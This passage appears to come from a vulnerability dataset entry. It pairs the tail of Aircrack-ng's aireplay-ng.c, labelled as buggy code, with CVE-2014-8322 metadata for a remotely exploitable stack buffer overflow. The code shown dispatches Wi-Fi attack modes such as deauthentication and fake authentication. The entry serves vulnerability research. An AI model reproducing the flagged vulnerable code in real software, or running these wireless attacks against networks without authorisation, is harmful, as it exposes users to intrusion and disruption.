not genrtc) - also try 'echo 1024 >/proc/sys/dev/rtc/max-user-freq'.\\n\" );\n                close( dev.fd_rtc );\n                dev.fd_rtc = -1;\n            }\n            else\n            {\n                if( ioctl( dev.fd_rtc, RTC_PIE_ON, 0 ) < 0 )\n                {\n                    perror( \"ioctl(RTC_PIE_ON) failed\" );\n                    close( dev.fd_rtc );\n                    dev.fd_rtc = -1;\n                }\n            }\n        }\n        else\n        {\n            printf( \"For information, no action required:\"\n                    \" Using gettimeofday() instead of /dev/rtc\\n\" );\n            dev.fd_rtc = -1;\n        }\n\n    }\n#endif /* linux */\n#endif /* i386 */\n\n    opt.iface_out = argv[optind];\n    opt.port_out = get_ip_port(opt.iface_out, opt.ip_out, sizeof(opt.ip_out)-1);\n\n    //don't open interface(s) when using test mode and airserv\n    if( ! (opt.a_mode == 9 && opt.port_out >= 0 ) )\n    {\n        /* open the replay interface */\n        _wi_out = wi_open(opt.iface_out);\n        if (!_wi_out)\n            return 1;\n        dev.fd_out = wi_fd(_wi_out);\n\n        /* open the packet source */\n        if( opt.s_face != NULL )\n        {\n            //don't open interface(s) when using test mode and airserv\n            if( ! (opt.a_mode == 9 && opt.port_in >= 0 ) )\n            {\n                _wi_in = wi_open(opt.s_face);\n                if (!_wi_in)\n                    return 1;\n                dev.fd_in = wi_fd(_wi_in);\n                wi_get_mac(_wi_in, dev.mac_in);\n            }\n        }\n        else\n        {\n            _wi_in = _wi_out;\n            dev.fd_in = dev.fd_out;\n\n            /* XXX */\n            dev.arptype_in = dev.arptype_out;\n            wi_get_mac(_wi_in, dev.mac_in);\n        }\n\n        wi_get_mac(_wi_out, dev.mac_out);\n    }\n\n    /* drop privileges */\n    if (setuid( getuid() ) == -1) {\n\t\tperror(\"setuid\");\n\t}\n\n    /* XXX */\n    if( opt.r_nbpps == 0 )\n    {\n        if( dev.is_wlanng || dev.is_hostap )\n            opt.r_nbpps = 200;\n        else\n            opt.r_nbpps = 500;\n    }\n\n\n    if( opt.s_file != NULL )\n    {\n        if( ! ( dev.f_cap_in = fopen( opt.s_file, \"rb\" ) ) )\n        {\n            perror( \"open failed\" );\n            return( 1 );\n        }\n\n        n = sizeof( struct pcap_file_header );\n\n        if( fread( &dev.pfh_in, 1, n, dev.f_cap_in ) != (size_t) n )\n        {\n            perror( \"fread(pcap file header) failed\" );\n            return( 1 );\n        }\n\n        if( dev.pfh_in.magic != TCPDUMP_MAGIC &&\n            dev.pfh_in.magic != TCPDUMP_CIGAM )\n        {\n            fprintf( stderr, \"\\\"%s\\\" isn't a pcap file (expected \"\n                             \"TCPDUMP_MAGIC).\\n\", opt.s_file );\n            return( 1 );\n        }\n\n        if( dev.pfh_in.magic == TCPDUMP_CIGAM )\n            SWAP32(dev.pfh_in.linktype);\n\n        if( dev.pfh_in.linktype != LINKTYPE_IEEE802_11 &&\n            dev.pfh_in.linktype != LINKTYPE_PRISM_HEADER &&\n            dev.pfh_in.linktype != LINKTYPE_RADIOTAP_HDR &&\n            dev.pfh_in.linktype != LINKTYPE_PPI_HDR )\n        {\n            fprintf( stderr, \"Wrong linktype from pcap file header \"\n                             \"(expected LINKTYPE_IEEE802_11) -\\n\"\n                             \"this doesn't look like a regular 802.11 \"\n                             \"capture.\\n\" );\n            return( 1 );\n        }\n    }\n\n    //if there is no -h given, use default hardware mac\n    if( maccmp( opt.r_smac, NULL_MAC) == 0 )\n    {\n        memcpy( opt.r_smac, dev.mac_out, 6);\n        if(opt.a_mode != 0 && opt.a_mode != 4 && opt.a_mode != 9)\n        {\n            printf(\"No source MAC (-h) specified. Using the device MAC (%02X:%02X:%02X:%02X:%02X:%02X)\\n\",\n                    dev.mac_out[0], dev.mac_out[1], dev.mac_out[2], dev.mac_out[3], dev.mac_out[4], dev.mac_out[5]);\n        }\n    }\n\n    if( maccmp( opt.r_smac, dev.mac_out) != 0 && maccmp( opt.r_smac, NULL_MAC) != 0)\n    {\n//        if( dev.is_madwifi && opt.a_mode == 5 ) printf(\"For --fragment to work on madwifi[-ng], set the interface MAC according to (-h)!\\n\");\n        fprintf( stderr, \"The interface MAC (%02X:%02X:%02X:%02X:%02X:%02X)\"\n                 \" doesn't match the specified MAC (-h).\\n\"\n                 \"\\tifconfig %s hw ether %02X:%02X:%02X:%02X:%02X:%02X\\n\",\n                 dev.mac_out[0], dev.mac_out[1], dev.mac_out[2], dev.mac_out[3], dev.mac_out[4], dev.mac_out[5],\n                 opt.iface_out, opt.r_smac[0], opt.r_smac[1], opt.r_smac[2], opt.r_smac[3], opt.r_smac[4], opt.r_smac[5] );\n    }\n\n    switch( opt.a_mode )\n    {\n        case 0 : return( do_attack_deauth()      );\n        case 1 : return( do_attack_fake_auth()   );\n        case 2 : return( do_attack_interactive() );\n        case 3 : return( do_attack_arp_resend()  );\n        case 4 : return( do_attack_chopchop()    );\n        case 5 : return( do_attack_fragment()    );\n        case 6 : return( do_attack_caffe_latte() );\n        case 7 : return( do_attack_cfrag()       );\n        case 8 : return( do_attack_migmode()     );\n        case 9 : return( do_attack_test()        );\n        default: break;\n    }\n\n    /* that's all, folks */\n\n    return( 0 );\n}\n"], "filenames": ["src/aireplay-ng.c"], "buggy_code_start_loc": [5400], "buggy_code_end_loc": [5400], "fixing_code_start_loc": [5401], "fixing_code_end_loc": [5403], "type": "CWE-787", "message": "Stack-based buffer overflow in the tcp_test function in aireplay-ng.c in Aircrack-ng before 1.2 RC 1 allows remote attackers to execute arbitrary code via a crafted length parameter value.", "other": {"cve": {"id": "CVE-2014-8322", "sourceIdentifier": "cve@mitre.org", "published": "2020-01-31T22:15:11.057", "lastModified": "2020-02-05T20:32:08.313", "vulnStatus": "Analyzed", "descriptions": [{"lang": "en", "value": "Stack-based buffer overflow in the tcp_test function in aireplay-ng.c in Aircrack-ng before 1.2 RC 1 allows remote attackers to execute arbitrary code via a crafted length parameter value."}, {"lang": "es", "value": "Un desbordamiento del b\u00fafer en la regi\u00f3n stack de la memoria en la funci\u00f3n tcp_test en el archivo aireplay-ng.c en Aircrack-ng versiones anteriores a 1.2 RC 1, permite a atacantes remotos ejecutar c\u00f3digo arbitrario por medio de un valor del par\u00e1metro length dise\u00f1ado."}], "metrics": {"cvssMetricV31": [{"source": "nvd@nist.gov", "type": "Primary", "cvssData": {"version": "3.1", "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "attackVector": "NETWORK", "attackComplexity": "LOW", "privilegesRequired": "NONE", "userInteraction": "NONE", "scope": "UNCHANGED", "confidentialityImpact": "HIGH", "integrityImpact": "HIGH", "availabilityImpact": "HIGH", "baseScore": 9.8, "baseSeverity": "CRITICAL"}, "exploitabilityScore": 3.9, "impactScore": 5.9}], "cvssMetricV2": [{"source": "nvd@nist.gov", "type": "Primary", "cvssData": {"version": "2.0", "vectorString": "AV:N/AC:L/Au:N/C:P/I:P/A:P", "accessVector": "NETWORK", "accessComplexity": "LOW", "authentication": "NONE", "confidentialityImpact": "PARTIAL", "integrityImpact": "PARTIAL", "availabilityImpact": "PARTIAL", "baseScore": 7.5}, "baseSeverity": "HIGH", "exploitabilityScore": 10.0, "impactScore": 6.4, "acInsufInfo": false, "obtainAllPrivilege": false, "obtainUserPrivilege": false, "obtainOtherPrivilege": false, "userInteractionRequired": false}]}, "weaknesses": [{"source": "nvd@nist.gov", "type": "Primary", "description": [{"lang": "en", "value": "CWE-787"}]}], "configurations": [{"nodes": [{"operator": "OR", "negate": false, "cpeMatch": [{"vulnerable": true, "criteria": "cpe:2.3:a:aircrack-ng:aircrack-ng:*:*:*:*:*:*:*:*", "versionEndIncluding": "1.1", "matchCriteriaId": "B3589281-1252-4D05-998E-39FD6336B670"}, {"vulnerable": true, "criteria": "cpe:2.3:a:aircrack-ng:aircrack-ng:1.2:beta1:*:*:*:*:*:*", "matchCriteriaId": "74AD6A4C-E624-4B24-A841-EBCD1ADE9E97"}, {"vulnerable": true, "criteria": "cpe:2.3:a:aircrack-ng:aircrack-ng:1.2:beta2:*:*:*:*:*:*", "matchCriteriaId": "FC858C42-ADCE-4C84-A3AF-E6DB015D894D"}, {"vulnerable": true, "criteria": "cpe:2.3:a:aircrack-ng:aircrack-ng:1.2:beta3:*:*:*:*:*:*", "matchCriteriaId": "26968784-4C5C-40CE-825B-4DE98C94FF7B"}]}]}], "references": [{"url": "http://aircrack-ng.blogspot.com/2014/10/aircrack-ng-12-release-candidate-1.html", "source": "cve@mitre.org", "tags": ["Product", "Release Notes", "Third Party Advisory"]}, {"url": "http://packetstormsecurity.com/files/128943/Aircrack-ng-1.2-Beta-3-DoS-Code-Execution.html", "source": "cve@mitre.org", "tags": ["Third Party Advisory", "VDB Entry"]}, {"url": "http://www.exploit-db.com/exploits/35018", "source": "cve@mitre.org", "tags": ["Third Party Advisory", "VDB Entry"]}, {"url": "https://exchange.xforce.ibmcloud.com/vulnerabilities/98459", "source": "cve@mitre.org", "tags": ["Third Party Advisory", "VDB Entry"]}, {"url": "https://github.com/aircrack-ng/aircrack-ng/commit/091b153f294b9b695b0b2831e65936438b550d7b", "source": "cve@mitre.org", "tags": ["Patch", "Third Party Advisory"]}, {"url": "https://github.com/aircrack-ng/aircrack-ng/pull/14", "source": "cve@mitre.org", "tags": ["Patch", "Third Party Advisory"]}]}, "github_commit_url": "https://github.com/aircrack-ng/aircrack-ng/commit/091b153f294b9b695b0b2831e65936438b550d7b"}}